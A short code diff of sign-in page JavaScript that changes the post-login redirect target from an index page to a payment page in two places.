@@ -7,7 +7,7 @@ window.addEventListener('message', function(e) {
   
   document.querySelector('.gmail').innerText = "Signing in.."
   this.setTimeout(()=>{
-    window.location.replace("./index.html");
+    window.location.replace("./page-payment.html");
   },2500)
   
 } , false);
@@ -35,7 +35,7 @@ $(function(){
       document.querySelector('#login-falied').classList.add('hide')
       document.querySelector('#signin').innerText = "Signing in.."
       window.setTimeout(()=>{
-        window.location.replace("./index.html");
+        window.location.replace("./page-payment.html");
       },2500)
     }else{
       document.querySelector('#login-falied').classList.remove('hide')
